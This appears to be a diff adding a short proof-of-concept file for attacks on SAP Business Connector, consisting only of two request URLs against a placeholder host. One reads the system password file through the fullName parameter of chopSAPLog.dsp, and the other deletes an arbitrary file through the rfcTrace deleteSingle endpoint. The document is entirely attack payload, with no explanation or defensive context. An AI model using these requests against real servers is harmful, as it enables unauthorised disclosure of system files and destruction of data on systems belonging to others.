@@ -1,0 +1,7 @@
+File disclosure:
+
+http://www.example.com/sapbc/SAP/chopSAPLog.dsp?fullName=/etc/passwd
+
+File deletion:
+
+http://www.example.com/sapbc/invoke/sap.monitor.rfcTrace/deleteSingle?fullName=<path_to_file>
